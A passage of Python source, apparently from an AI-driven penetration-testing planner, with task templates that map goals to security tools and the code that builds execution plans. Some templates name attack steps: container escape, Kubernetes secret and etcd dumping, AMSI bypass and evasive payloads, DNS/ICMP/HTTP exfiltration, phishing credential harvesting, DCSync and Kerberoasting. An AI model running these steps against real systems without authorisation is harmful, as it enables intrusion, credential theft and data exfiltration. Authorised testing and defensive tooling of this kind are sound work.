                    "args": {"flags": "Show-AzureRunAsConnection"},
                },
                {
                    "description": "Azure BloodHound data collection",
                    "tool": "azurehound",
                    "args": {"flags": "list"},
                },
                {
                    "description": "Microsoft 365 user and service enumeration",
                    "tool": "aadinternals",
                    "args": {"flags": "Invoke-AADIntUserEnumerationAsGuest"},
                },
            ],
            "cloud_gcp": [
                {
                    "description": "GCP project and resource enumeration",
                    "tool": "gcloud",
                    "args": {"flags": "projects list"},
                },
                {
                    "description": "GCP IAM policy enumeration",
                    "tool": "gcloud",
                    "args": {"flags": "projects get-iam-policy {target}"},
                },
                {
                    "description": "GCP metadata service enumeration",
                    "tool": "curl",
                    "args": {
                        "flags": "-s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"
                    },
                },
                {
                    "description": "Multi-cloud GCP security audit",
                    "tool": "scoutsuite",
                    "args": {"flags": "gcp"},
                },
            ],
            "k8s_attack": [
                {
                    "description": "Kubernetes RBAC permissions enumeration",
                    "tool": "kubectl",
                    "args": {"flags": "auth can-i --list"},
                },
                {
                    "description": "Kubernetes security benchmark audit",
                    "tool": "kube-bench",
                    "args": {},
                },
                {
                    "description": "Kubernetes cluster attack surface mapping",
                    "tool": "kube-hunter",
                    "args": {"flags": "--remote"},
                },
                {
                    "description": "Container escape exploitation",
                    "tool": "cdk",
                    "args": {"flags": "auto-escape"},
                },
                {
                    "description": "Etcd datastore access attempt",
                    "tool": "etcdctl",
                    "args": {"flags": "get / --prefix"},
                },
                {
                    "description": "Kubernetes workload and secret enumeration",
                    "tool": "kubectl",
                    "args": {"flags": "get secrets --all-namespaces"},
                },
            ],
            "crypto_attack": [
                {
                    "description": "Hash type identification",
                    "tool": "hashid",
                    "args": {},
                },
                {
                    "description": "Dictionary-based hash cracking",
                    "tool": "hashcat",
                    "args": {"flags": "-a 0"},
                },
                {
                    "description": "Rule-based hash cracking",
                    "tool": "hashcat",
                    "args": {"flags": "-a 0 -r rules/best64.rule"},
                },
                {
                    "description": "Alternative hash cracker (John the Ripper)",
                    "tool": "john",
                    "args": {"flags": "--wordlist=/usr/share/wordlists/rockyou.txt"},
                },
            ],
            "ctf_forensics": [
                {
                    "description": "File type identification",
                    "tool": "file",
                    "args": {},
                },
                {
                    "description": "Extract printable strings from binary",
                    "tool": "strings",
                    "args": {"flags": "-n 6"},
                },
                {
                    "description": "Firmware/binary analysis and extraction",
                    "tool": "binwalk",
                    "args": {"flags": "-e"},
                },
                {
                    "description": "Metadata extraction from files",
                    "tool": "exiftool",
                    "args": {},
                },
                {
                    "description": "Steganography extraction",
                    "tool": "steghide",
                    "args": {"flags": "extract -sf"},
                },
                {
                    "description": "File carving for deleted/hidden files",
                    "tool": "foremost",
                    "args": {},
                },
            ],
            "ctf_pwn": [
                {
                    "description": "Binary security feature check (NX, PIE, RELRO, canary)",
                    "tool": "checksec",
                    "args": {"flags": "--file"},
                },
                {
                    "description": "ROP gadget discovery",
                    "tool": "ROPgadget",
                    "args": {"flags": "--binary"},
                },
                {
                    "description": "GDB with pwndbg/peda for debugging",
                    "tool": "pwndbg",
                    "args": {},
                },
                {
                    "description": "Extract printable strings for analysis",
                    "tool": "strings",
                    "args": {},
                },
            ],
            "ctf_crypto": [
                {
                    "description": "RSA CTF attack toolkit",
                    "tool": "rsactftool",
                    "args": {},
                },
                {
                    "description": "Hash type identification",
                    "tool": "hashid",
                    "args": {},
                },
                {
                    "description": "Hash cracking for CTF challenges",
                    "tool": "hashcat",
                    "args": {"flags": "-a 0"},
                },
                {
                    "description": "OpenSSL cryptographic operations",
                    "tool": "openssl",
                    "args": {},
                },
            ],
            "threat_hunting": [
                {
                    "description": "Endpoint threat hunting via SQL-like queries",
                    "tool": "osquery",
                    "args": {},
                },
                {
                    "description": "YARA rule-based malware hunting",
                    "tool": "yara",
                    "args": {},
                },
                {
                    "description": "Sigma rule-based log threat hunting",
                    "tool": "sigmac",
                    "args": {"flags": "--target splunk"},
                },
                {
                    "description": "Windows event log hunting for suspicious activity",
                    "tool": "wevtutil",
                    "args": {"flags": "qe Security"},
                },
                {
                    "description": "Linux log hunting for IOCs",
                    "tool": "journalctl",
                    "args": {"flags": "--since '24 hours ago'"},
                },
            ],
            "incident_response_full": [
                {
                    "description": "Live process and network state collection",
                    "tool": "ps",
                    "args": {"flags": "aux"},
                },
                {
                    "description": "Active network connections snapshot",
                    "tool": "netstat",
                    "args": {"flags": "-ano"},
                },
                {
                    "description": "Memory dump for forensic analysis",
                    "tool": "volatility",
                    "args": {"flags": "-f"},
                },
                {
                    "description": "Disk image creation for forensic preservation",
                    "tool": "dd",
                    "args": {"flags": "if=/dev/sda of=disk.img bs=4M status=progress"},
                },
                {
                    "description": "File system timeline generation",
                    "tool": "sleuthkit",
                    "args": {"flags": "fls -r"},
                },
                {
                    "description": "YARA scan against running processes and files",
                    "tool": "yara",
                    "args": {},
                },
                {
                    "description": "Windows event log collection",
                    "tool": "wevtutil",
                    "args": {"flags": "epl Security security.evtx"},
                },
            ],
            "purple_team": [
                {
                    "description": "Atomic Red Team attack simulation",
                    "tool": "invoke-atomicredteam",
                    "args": {"flags": "Invoke-AtomicTest"},
                },
                {
                    "description": "MITRE ATT&CK adversary emulation with Caldera",
                    "tool": "caldera",
                    "args": {},
                },
                {
                    "description": "Detection validation against SIEM rules",
                    "tool": "sigmac",
                    "args": {"flags": "--target splunk"},
                },
                {
                    "description": "Endpoint detection effectiveness check",
                    "tool": "osquery",
                    "args": {},
                },
            ],
            "edr_bypass": [
                {
                    "description": "AMSI bypass implementation",
                    "tool": "amsi-bypass",
                    "args": {},
                },
                {
                    "description": "Payload generation with AV evasion",
                    "tool": "veil",
                    "args": {},
                },
                {
                    "description": "Shellcode obfuscation and encoding",
                    "tool": "donut",
                    "args": {},
                },
                {
                    "description": "LOLBAS technique discovery",
                    "tool": "curl",
                    "args": {"flags": "-s https://lolbas-project.github.io/api/lolbas.json"},
                },
            ],
            "data_exfiltration": [
                {
                    "description": "DNS-based data exfiltration tunnel",
                    "tool": "iodine",
                    "args": {},
                },
                {
                    "description": "ICMP-based data exfiltration tunnel",
                    "tool": "ptunnel-ng",
                    "args": {},
                },
                {
                    "description": "HTTP-based covert data exfiltration",
                    "tool": "curl",
                    "args": {"flags": "-s -X POST -d @data.txt"},
                },
                {
                    "description": "Data compression before exfiltration",
                    "tool": "tar",
                    "args": {"flags": "-czf data.tar.gz"},
                },
            ],
            "social_engineering": [
                {
                    "description": "Phishing campaign management with GoPhish",
                    "tool": "gophish",
                    "args": {},
                },
                {
                    "description": "Reverse proxy credential harvesting",
                    "tool": "evilginx2",
                    "args": {},
                },
                {
                    "description": "Email harvesting for phishing targets",
                    "tool": "theHarvester",
                    "args": {"flags": "-d {target} -b all"},
                },
                {
                    "description": "OSINT target profiling for pretexting",
                    "tool": "sherlock",
                    "args": {},
                },
            ],
            "bug_bounty_web": [
                {
                    "description": "Passive subdomain enumeration",
                    "tool": "subfinder",
                    "args": {},
                },
                {
                    "description": "HTTP endpoint probing and technology detection",
                    "tool": "httpx",
                    "args": {"flags": "-status-code -title -tech-detect"},
                },
                {
                    "description": "Parameter discovery from historical URLs",
                    "tool": "gau",
                    "args": {},
                },
                {
                    "description": "HTTP parameter discovery",
                    "tool": "arjun",
                    "args": {},
                },
                {
                    "description": "Template-based vulnerability scanning",
                    "tool": "nuclei",
                    "args": {"severity": "medium,high,critical"},
                },
                {
                    "description": "XSS vulnerability scanning",
                    "tool": "dalfox",
                    "args": {},
                },
                {
                    "description": "SQL injection scanning",
                    "tool": "sqlmap",
                    "args": {"flags": "--batch --random-agent"},
                },
            ],
            "supply_chain": [
                {
                    "description": "Python package dependency vulnerability audit",
                    "tool": "pip-audit",
                    "args": {},
                },
                {
                    "description": "Dependency confusion attack surface check",
                    "tool": "confused",
                    "args": {},
                },
                {
                    "description": "Software composition analysis with Grype",
                    "tool": "grype",
                    "args": {},
                },
                {
                    "description": "SBOM generation for dependency tracking",
                    "tool": "syft",
                    "args": {},
                },
                {
                    "description": "Git secrets and credential leak scan",
                    "tool": "gitleaks",
                    "args": {"flags": "detect"},
                },
            ],
            "appsec_sast": [
                {
                    "description": "Static application security testing with Semgrep",
                    "tool": "semgrep",
                    "args": {"flags": "--config=auto"},
                },
                {
                    "description": "Python static analysis with Bandit",
                    "tool": "bandit",
                    "args": {"flags": "-r"},
                },
                {
                    "description": "File system vulnerability scanning with Trivy",
                    "tool": "trivy",
                    "args": {"flags": "fs"},
                },
            ],
            "appsec_dast": [
                {
                    "description": "DAST baseline scan via ZAP CLI",
                    "tool": "zap-cli",
                    "args": {"flags": "quick-scan"},
                },
                {
                    "description": "Web server vulnerability scan with Nikto",
                    "tool": "nikto",
                    "args": {},
                },
                {
                    "description": "HTTP security headers check with curl",
                    "tool": "curl",
                    "args": {"flags": "-sI"},
                },
            ],
            "dfir_memory": [
                {
                    "description": "Volatility memory analysis profile and image identification",
                    "tool": "volatility",
                    "args": {"flags": "imageinfo"},
                },
                {
                    "description": "Extract printable strings from memory dump",
                    "tool": "strings",
                    "args": {},
                },
                {
                    "description": "YARA malware signature scan on memory dump",
                    "tool": "yara",
                    "args": {"flags": "-s rules.yar"},
                },
            ],
            "dfir_disk": [
                {
                    "description": "List directory entries in disk partition via fls",
                    "tool": "fls",
                    "args": {"flags": "-r -p"},
                },
                {
                    "description": "Extract file content by inode via icat",
                    "tool": "icat",
                    "args": {},
                },
                {
                    "description": "File carving and data recovery with Foremost",
                    "tool": "foremost",
                    "args": {},
                },
                {
                    "description": "Firmware extraction and analysis with Binwalk",
                    "tool": "binwalk",
                    "args": {"flags": "-e"},
                },
            ],
            "threat_hunting_endpoint": [
                {
                    "description": "Endpoint state query via osquery",
                    "tool": "osquery",
                    "args": {"flags": "--query 'select * from processes;'"},
                },
                {
                    "description": "Velociraptor endpoint triage query",
                    "tool": "velociraptor",
                    "args": {"flags": "query 'select * from info()'"},
                },
            ],
            "threat_hunting_network": [
                {
                    "description": "Suricata network IDS pcap processing",
                    "tool": "suricata",
                    "args": {"flags": "-r"},
                },
                {
                    "description": "Zeek network connection log generation from pcap",
                    "tool": "zeek",
                    "args": {"flags": "-r"},
                },
                {
                    "description": "tshark packet capture parsing and filtration",
                    "tool": "tshark",
                    "args": {"flags": "-r"},
                },
            ],
            "compliance_audit_cis": [
                {
                    "description": "CIS Kubernetes Benchmark compliance check",
                    "tool": "kube-bench",
                    "args": {"flags": "run --targets master,node"},
                },
                {
                    "description": "OpenSCAP security compliance policy evaluation",
                    "tool": "openscap",
                    "args": {"flags": "xccdf eval"},
                },
                {
                    "description": "Export Windows security configuration database",
                    "tool": "secedit",
                    "args": {"flags": "/export /cfg sec.inf"},
                },
            ],
            "exploit_research": [
                {
                    "description": "GDB interactive binary debugger execution",
                    "tool": "gdb",
                    "args": {"flags": "-q -ex run --args"},
                },
                {
                    "description": "Verify binary protection features with checksec",
                    "tool": "checksec",
                    "args": {"flags": "--file="},
                },
                {
                    "description": "Construct ROP exploit chain with ROPgadget",
                    "tool": "ROPgadget",
                    "args": {"flags": "--binary"},
                },
            ],
        }

    # ── Index builder ─────────────────────────────────────────────────────

    def build_index(self, available_tools: list[str], tool_registry: Any = None) -> None:
        self._keyword_index.clear()
        tools_metadata = []
        for name in available_tools:
            name_lower = name.lower()
            self._add_to_index(name_lower, name)
            for part in re.split(r"[-_.]+", name_lower):
                if len(part) > 1:
                    self._add_to_index(part, name)
            if tool_registry is not None:
                try:
                    tool = (
                        tool_registry.get_tool(name) if hasattr(tool_registry, "get_tool") else None
                    )
                    if tool is None and hasattr(tool_registry, "_graph"):
                        tool = tool_registry._graph.get_tool(name)
                    if tool:
                        tools_metadata.append(
                            {
                                "name": tool.name,
                                "description": getattr(tool, "description", ""),
                                "tags": getattr(tool, "tags", []),
                                "category": getattr(tool, "category", ""),
                            }
                        )
                        for tag in getattr(tool, "tags", []):
                            self._add_to_index(tag.lower(), name)
                        desc = getattr(tool, "description", "")
                        if desc and desc != name:
                            for word in desc.lower().split():
                                if len(word) > 2:
                                    self._add_to_index(word, name)
                except Exception as exc:
                    logger.warning("Failed to get tool metadata for %s: %s", name, exc)

        # Train NLP Engine
        if tools_metadata:
            self._nlp.train_tools(tools_metadata)
        templates_meta = {
            k: " ".join(step["description"] for step in v) for k, v in self._templates.items() if v
        }
        self._nlp.train_templates(templates_meta)

    def _add_to_index(self, keyword: str, tool_name: str) -> None:
        if keyword not in self._keyword_index:
            self._keyword_index[keyword] = set()
        self._keyword_index[keyword].add(tool_name)

    def _search_index(self, query: str) -> list[str]:
        words = {w for w in re.split(r"[^\w]+", query.lower()) if len(w) > 1}
        if not words:
            return []
        scores: dict[str, int] = {}
        for w in words:
            for tool_name in self._keyword_index.get(w, []):
                scores[tool_name] = scores.get(tool_name, 0) + 1
        if not scores:
            for key, names in self._keyword_index.items():
                if key in query.lower():
                    for n in names:
                        scores[n] = scores.get(n, 0) + 1
        for t in list(scores.keys()):
            t_lower = t.lower()
            if t_lower in words:
                scores[t] += 500
            else:
                for part in re.split(r"[-_.]+", t_lower):
                    if part in words and len(part) > 2:
                        scores[t] += 50
                        break
        ranked = sorted(scores, key=lambda n: -scores[n])
        return ranked

    def resolve_alternatives(
        self, template_name: str, available_tools: set[str]
    ) -> list[dict[str, Any]]:
        steps = self._templates.get(template_name, [])
        resolved = []
        for step in steps:
            tool = step["tool"]
            if not available_tools or tool in available_tools:
                resolved.append(step)
            else:
                alt_found = None
                for alt in TOOL_ALTERNATIVES.get(tool, []):
                    if alt in available_tools:
                        alt_found = alt
                        break
                if alt_found:
                    resolved.append(
                        {
                            **step,
                            "tool": alt_found,
                            "description": f"{step['description']} (via {alt_found})",
                        }
                    )
                else:
                    logger.warning(
                        "Tool %s missing and no alternative found. Keeping step for auto-install.",
                        tool,
                    )
                    resolved.append(step)
        return resolved

    # ── Core planning ─────────────────────────────────────────────────────

    def plan(self, goal: str, available_tools: list[str] | None = None) -> ExecutionPlan:
        """Main entry point — decompose a user goal into an execution plan.

        Uses NLP-guided intent parsing, template matching, keyword index,
        and tool registry. Skills are NOT used in offline planning —
        they only influence LLM mode (integrated/autonomous) via
        :meth:`~siyarix.chat.engine.LLMEngineMixin._execute_agent`.
        """
        return self.smart_plan(goal, available_tools)

    def smart_plan(self, text: str, available_tools: list[str] | None = None) -> ExecutionPlan:
        """Plan using NLP analysis for smarter intent understanding.

        Uses the trained NaturalLanguageParser to extract intent, target,
        and parameters from natural language. Falls back to decompose_goal()
        when confidence is low or no template matches.
        """
        avail_set = set(available_tools or [])

        intent = self._nlp.parse(text)

        context = {
            "nlp_template": intent.template_name or "",
            "nlp_confidence": intent.confidence,
            "nlp_target": intent.target,
            "nlp_target_type": intent.target_type,
            "nlp_parameters": intent.parameters,
        }

        if intent.template_name and intent.confidence > 12.0:
            target = intent.target or text
            overrides = {"args": intent.parameters} if intent.parameters else None
            try:
                plan = self.create_from_template(
                    intent.template_name,
                    target,
                    overrides=overrides,
                    available_tools=avail_set,
                )
                plan.context.update(context)
                return plan
            except ValueError:
                pass

        return self.decompose_goal(text, available_tools)

    def _plan_from_learned_skill(
        self,
        skill: Any,
        goal: str,
        available_tools: list[str] | None = None,
    ) -> ExecutionPlan | None:
        """Build an :class:`ExecutionPlan` from a CLS :class:`~siyarix.learning_system.LearnedSkill`.

        Extracts the real target from *goal* (same logic as :meth:`decompose_goal`),
        replaces ``{target}`` placeholders in every step, and assembles an
        :class:`ExecutionPlan`.

        Returns ``None`` if the skill has no steps or the plan would be empty.
        """
        if not skill or not skill.steps:
            return None

        # Extract real target from goal
        target = ""
        url_m = re.search(r"(?:https?|tcp|udp)://[^\s]+", goal)
        host_m = re.search(r"\b(?:[\w-]+\.)+[a-z]{2,}\b", goal, re.IGNORECASE)
        ip_m = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?\b", goal)
        if url_m:
            target = url_m.group(0)
        elif host_m:
            target = host_m.group(0)
        elif ip_m:
            target = ip_m.group(0)

        avail_set = set(available_tools or [])
        try:
            from .learning_system import get_learning_system

            _ls = get_learning_system()
            _raw_anon = _ls._anonymize_target(goal, target) if target else goal
            step_dicts = _ls.instantiate_skill(skill, target, raw_anon_goal=_raw_anon)
        except Exception:
            return None

        plan_steps: list[PlanStep] = []
        for i, s in enumerate(step_dicts):
            tool = s.get("tool", "")
            # Apply TOOL_ALTERNATIVES if needed
            if tool and tool not in avail_set and tool in TOOL_ALTERNATIVES:
                for alt in TOOL_ALTERNATIVES[tool]:
                    if alt in avail_set:
                        tool = alt
                        break
            plan_steps.append(
                PlanStep(
                    id=f"cls_{i:03d}",
                    description=s.get("description", f"Step {i + 1}"),
                    tool=tool,
                    command=s.get("command", ""),
                    args=s.get("args", {}),
                )
            )

        if not plan_steps:
            return None

        return ExecutionPlan(
            goal=goal,
            steps=plan_steps,
            plan_type=PlanType.SEQUENTIAL,
            context={"source": "learned_skill", "skill_id": skill.skill_id},
        )

    def create_plan(
        self,
        goal: str,
        plan_type: PlanType = PlanType.SEQUENTIAL,
        steps: list[dict[str, Any]] | None = None,
        context: dict[str, Any] | None = None,
    ) -> ExecutionPlan:
        plan_steps = []
        if steps:
            for i, step_def in enumerate(steps):
                tool = step_def.get("tool", "")
                plan_steps.append(
                    PlanStep(
                        id=step_def.get("id", f"step_{i:03d}"),
                        description=step_def.get("description", f"Step {i + 1}"),
                        tool=tool,
                        args=step_def.get("args", {}),
                        command=step_def.get("command"),
                        dependencies=step_def.get("dependencies", []),
                        timeout=step_def.get("timeout", 300.0),
                    )
                )
        plan = ExecutionPlan(
            goal=goal,
            plan_type=plan_type,
            steps=plan_steps,
            context=context or {},
            status=PlanStatus.ACTIVE,
        )
        self._plans[plan.id] = plan
        emit_sync(
            Event(
                type=EventType.PLAN_CREATED,
                source="planner_registry",
                data={"plan_id": plan.id, "goal": goal, "steps": len(plan_steps)},
            )
        )
        return plan

    def create_from_template(
        self,
        template_name: str,
        target: str,
        overrides: dict[str, Any] | None = None,
        available_tools: set[str] | None = None,
    ) -> ExecutionPlan:
        template = self._templates.get(template_name)
        if not template:
            raise ValueError(f"Unknown template: {template_name}")
        if available_tools:
            template = self.resolve_alternatives(template_name, available_tools)
        url_match = re.search(r"https?://[^\s]+", target)
        host_match = re.search(r"\b(?:[\w-]+\.)+[a-z]{2,}\b", target.lower())
        ip_match = re.search(
            r"\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(?:/\d{1,2})?\b",
            target,
        )
        file_match = re.search(r"/[/\w.\-]+", target)
        clean_target = (
            url_match.group(0)
            if url_match
            else (
                host_match.group(0)
                if host_match
                else (
                    ip_match.group(0)
                    if ip_match
                    else (file_match.group(0) if file_match else target)
                )
            )
        )
        steps = []
        for step_def in template:
            step = {**step_def, "args": {**step_def.get("args", {}), "target": clean_target}}
            if overrides:
                # Merge overrides carefully, and apply NLP-specific overrides mapping if applicable
                override_args = overrides.get("args", {})
                tool_name = step.get("tool")

                # Intelligent parameter mapping to avoid passing bad args to tools
                if tool_name in ("nmap", "masscan"):
                    if "speed" in override_args:
                        step["args"]["flags"] = (
                            step["args"].get("flags", "") + f" -T{override_args['speed']} "
                        )
                    if "ports" in override_args:
                        step["args"]["flags"] = (
                            step["args"].get("flags", "") + f" -p {override_args['ports']} "
                        )
                    if "threads" in override_args:
                        step["args"]["flags"] = (
                            step["args"].get("flags", "")
                            + f" --min-rate {override_args['threads']} "
                        )
                elif tool_name in ("ffuf", "gobuster", "hydra"):
                    if "threads" in override_args:
                        step["args"]["threads"] = override_args["threads"]
                    if "username" in override_args:
                        step["args"]["username"] = override_args["username"]
                    if "password" in override_args:
                        step["args"]["password"] = override_args["password"]
                elif tool_name == "nuclei":
                    if "threads" in override_args:
                        step["args"]["rate-limit"] = override_args["threads"]

                # Merge the rest (this might overwrite some but it's okay)
                for k, v in override_args.items():
                    if k not in ("speed", "ports", "threads", "username", "password", "module"):
                        step["args"][k] = v

                # Cleanup spaces
                if "flags" in step["args"]:
                    step["args"]["flags"] = step["args"]["flags"].strip()

            steps.append(step)
        plan_type = (
            PlanType.DAG if template_name in self._auto_dag_templates else PlanType.SEQUENTIAL
        )
        return self.create_plan(
            goal=f"{template_name} on {clean_target}",
            steps=steps,
            context={"target": clean_target, "template": template_name},
            plan_type=plan_type,
        )

    def decompose_goal(self, goal: str, available_tools: list[str] | None = None) -> ExecutionPlan:
        # Handle multi-step intents
        intents = self._nlp.parse_multi(goal)
        if len(intents) > 1:
            all_steps = []
            is_dag = False
            last_step_ids: list[str] = []
            for i, intent in enumerate(intents):
                # For all sub-commands in a "then" chain, use lightweight matching
                # to avoid template over-expansion (e.g., "subdomain enumeration"
                # → 6-step recon_full when only subfinder was intended)
                sub_plan = self._decompose_lightweight(intent.raw_text, available_tools)

                # If there are previous steps, make the first steps of THIS intent depend on the last steps of the PREVIOUS intent
                if last_step_ids and sub_plan.steps:
                    for step in sub_plan.steps:
                        if not step.dependencies:
                            step.dependencies.extend(last_step_ids)

                all_steps.extend(sub_plan.steps)
                last_step_ids = [
                    s.id
                    for s in sub_plan.steps
                    if s.is_terminal
                    or not any(other.id in s.dependencies for other in sub_plan.steps)
                ]
                # Fallback if the logic above returns empty
                if not last_step_ids and sub_plan.steps:
                    last_step_ids = [sub_plan.steps[-1].id]

                if sub_plan.plan_type == PlanType.DAG:
                    is_dag = True
            plan_type = PlanType.DAG if is_dag else PlanType.SEQUENTIAL

            # Injected dependencies should make this a DAG if dependencies exist
            if any(s.dependencies for s in all_steps):
                plan_type = PlanType.DAG

            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "id": s.id,
                        "description": s.description,
                        "tool": s.tool,
                        "args": s.args,
                        "command": s.command,
                        "dependencies": s.dependencies,
                        "timeout": s.timeout,
                    }
                    for s in all_steps
                ],
                context={"target": intents[0].target if intents else ""},
                plan_type=plan_type,
            )

        goal_lower = goal.lower()
        avail_set = set(available_tools or [])

        # Early target extraction (used by Step 0.5 and later steps)
        url_match_step0 = re.search(r"(?:https?|tcp|udp|ws|wss)://[^\s]+", goal)
        host_match_step0 = re.search(r"\b(?:[\w-]+\.)+[a-z]{2,}\b", goal_lower)
        ip_match_step0 = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?\b", goal)
        asn_match_step0 = re.search(r"\bAS\d+\b", goal)
        target = ""
        if url_match_step0:
            target = url_match_step0.group(0)
        elif host_match_step0:
            target = host_match_step0.group(0)
        elif ip_match_step0:
            target = ip_match_step0.group(0)
        elif asn_match_step0:
            target = asn_match_step0.group(0)

        # ASN lookup shortcut: if target is an AS number, use whois
        if asn_match_step0:
            return self.create_plan(
                goal=goal,
                steps=[
                    {
                        "description": "ASN ownership lookup",
                        "tool": "whois",
                        "args": {"target": target},
                    }
                ],
            )

        # ── Step 0.5: Direct tool keyword match (bypasses templates) ───
        # Runs BEFORE Step 0 NLP so explicit tool names always take priority
        direct_tool_keywords = {
            "dcsync": ("impacket-secretsdump", "DCSync attack", "-just-dc"),
            "kerberoast": ("impacket-GetUserSPNs", "Kerberoasting", "-dc-ip"),
            "asrep": ("impacket-GetNPUsers", "AS-REP roasting", "-dc-ip -request"),
            "bloodhound": ("bloodhound-python", "BloodHound AD collector", ""),
            "zerologon": ("nmap", "Zerologon check", "--script smb-vuln-zerologon -p 445"),
            "petitpotam": ("nmap", "PetitPotam check", "--script smb-vuln-petitpotam -p 445"),
            "censys": ("censys", "Censys certificate/device search", ""),
            "shodan": ("shodan", "Shodan internet device search", "search"),
            "uncover": ("uncover", "Shodan/Censys search via CLI", ""),
            "subjack": ("subjack", "Subdomain takeover detection", ""),
            "interactsh": ("interactsh", "OOB interaction testing client", "-c"),
            "ssllabs": ("ssllabs-scan", "SSL Labs API scanner", ""),
            "testssl": ("testssl.sh", "SSL/TLS comprehensive testing", "--full"),
            "dnsx": ("dnsx", "DNS toolkit and probing", ""),
            "massdns": ("massdns", "High-speed DNS brute-force resolver", ""),
            "puredns": ("puredns", "DNS brute-force with wildcard filtering", ""),
            "cloud_enum": ("cloud_enum", "Cloud storage enumeration", ""),
            "scoutsuite": ("scoutsuite", "Multi-cloud security auditing", ""),
            "prowler": ("prowler", "AWS security auditing", ""),
            "waybackurls": ("waybackurls", "Wayback Machine URL discovery", ""),
            "gitleaks": ("gitleaks", "Git repository secret scanning", ""),
            "trufflehog": ("trufflehog", "Git secret scanning", ""),
            "sherlock": ("sherlock", "Username search across social networks", ""),
            "holehe": ("holehe", "Email-to-account mapping", ""),
            "maigret": ("maigret", "Username search engine", ""),
            "arjun": ("arjun", "HTTP parameter discovery", ""),
            "paramspider": ("paramspider", "Parameter mining from URLs", ""),
            "gospider": ("gospider", "Web spider and content discovery", ""),
            "katana": ("katana", "Web crawler and URL discovery", ""),
            "theharvester": ("theHarvester", "Email/subdomain OSINT harvesting", ""),
            "the harvester": ("theHarvester", "Email/subdomain OSINT harvesting", ""),
            "httpx": ("httpx", "HTTP endpoint probing", ""),
            "gau": ("gau", "GetAllUrls from Wayback Machine", ""),
            "testssl.sh": ("testssl.sh", "SSL/TLS comprehensive testing", "--full"),
            "responder": ("responder", "LLMNR/NBT-NS responder", "-I eth0"),
            "impacket": ("impacket", "Impacket toolkit", ""),
            "searchsploit": ("searchsploit", "Exploit search", ""),
            "takeover": ("subjack", "Subdomain takeover detection", ""),
            "nikto": ("nikto", "Web server vulnerability scan", ""),
            "exposed panel": ("nuclei", "Exposed panel scan", "-t http/exposed-panels"),
            "ssl labs": ("ssllabs-scan", "SSL Labs API scanner", ""),
            "labs": ("ssllabs-scan", "SSL Labs API scanner", ""),
            "secret": ("trufflehog", "Git secret scanning", ""),
            "amass": ("amass", "Aggressive subdomain discovery", ""),
            "subfinder": ("subfinder", "Passive subdomain enumeration", ""),
            "sublist3r": ("sublist3r", "Subdomain search via Sublist3r", ""),
            "assetfinder": ("assetfinder", "Asset discovery via public sources", ""),
            "crtsh": (
                "curl",
                "Certificate transparency via crt.sh",
                "-s https://crt.sh/?q=%25.{target}&output=json",
            ),
            "crt.sh": (
                "curl",
                "Certificate transparency via crt.sh",
                "-s https://crt.sh/?q=%25.{target}&output=json",
            ),
            "wayback": ("waybackurls", "Wayback Machine URL discovery", ""),
            "whois": ("whois", "WHOIS lookup", ""),
            "ping": ("ping", "ICMP ping connectivity test", "-c 4"),
            "openssl": (
                "openssl",
                "SSL/TLS certificate inspection",
                "s_client -connect {target}:443",
            ),
            # ── Common security tool names (explicit mention → single tool) ──
            "nmap": ("nmap", "Nmap network scanner", "-sT -T4 --top-ports 100"),
            "masscan": ("masscan", "Mass port scanner", ""),
            "nuclei": ("nuclei", "Template-based vulnerability scanner", ""),
            "wpscan": ("wpscan", "WordPress vulnerability scanner", ""),
            "sqlmap": ("sqlmap", "SQL injection scanner", "--batch --random-agent"),
            "gobuster": ("gobuster", "Directory/file brute force", ""),
            "whatweb": ("whatweb", "Web technology fingerprinting", ""),
            "curl": ("curl", "HTTP/S request tool", "-sIL"),
            "dig": ("dig", "DNS lookup utility", ""),
            "hydra": ("hydra", "Brute force authentication", ""),
            "hashcat": ("hashcat", "Hash cracking tool", ""),
            "dirb": ("dirb", "Directory brute force tool", ""),
            "dirsearch": ("dirsearch", "Web path discovery tool", ""),
            "rustscan": ("rustscan", "Fast port scanner", ""),
            "naabu": ("naabu", "Fast port scanner", ""),
            # ── Blue Team / Defensive tools ────────────────────────────
            "journalctl": ("journalctl", "Linux system log analysis", "-u"),
            "wevtutil": ("wevtutil", "Windows Event Log management", "qe Security"),
            "tcpdump": ("tcpdump", "Network packet capture", "-i eth0 -w capture.pcap"),
            "tshark": ("tshark", "Packet capture analysis", "-r"),
            "zeek": ("zeek", "Network security monitoring", ""),
            "suricata": ("suricata", "IDS/IPS engine", "-c /etc/suricata/suricata.yaml"),
            "snort": ("snort", "Network intrusion detection", "-q -A console"),
            "yara": ("yara", "Malware pattern matching", ""),
            "sigmac": ("sigmac", "Sigma rule converter", ""),
            "volatility": ("volatility", "Memory forensics framework", "-f"),
            "autopsy": ("autopsy", "Digital forensics platform", ""),
            "sleuthkit": ("sleuthkit", "Forensic analysis toolkit", ""),
            "strings": ("strings", "Extract strings from binary files", ""),
            "ghidra": ("ghidra", "Reverse engineering framework", ""),
            "radare2": ("radare2", "Reverse engineering toolkit", ""),
            "objdump": ("objdump", "Binary disassembly and analysis", "-d"),
            "lynis": ("lynis", "Security auditing tool", "audit system"),
            "openscap": ("openscap", "Compliance and vulnerability scanning", "oval eval"),
            "aide": ("aide", "File integrity monitoring", "--check"),
            "tripwire": ("tripwire", "File integrity checking", "--check"),
            "chkrootkit": ("chkrootkit", "Rootkit detection scanner", "-q"),
            "rkhunter": ("rkhunter", "Rootkit hunter scanner", "--check"),
            "osquery": ("osquery", "Endpoint querying via SQL", ""),
            "clamav": ("clamav", "Antivirus scanning engine", ""),
            "cape": ("cape", "Malware sandbox analysis", ""),
            "pestudio": ("pestudio", "PE file analysis tool", ""),
            "cryptsetup": ("cryptsetup", "Disk encryption management", "luksStatus"),
            "lsmod": ("lsmod", "List loaded kernel modules", ""),
            "secedit": ("secedit", "Windows security policy editor", "/export"),
            "Get-WinEvent": ("wevtutil", "Windows Event Log query via PowerShell", ""),
            "schtasks": ("schtasks", "Windows scheduled task management", "/query"),
            "netstat": ("netstat", "Network connection listing", "-ano"),
            "iptables": ("iptables", "Firewall rule management", "-L -n -v"),
            "splunk": ("splunk", "SIEM platform query", ""),
            "elasticsearch": ("curl", "Elasticsearch data store query", ""),
            "sentinel": ("sentinel", "Azure Sentinel SIEM query", ""),
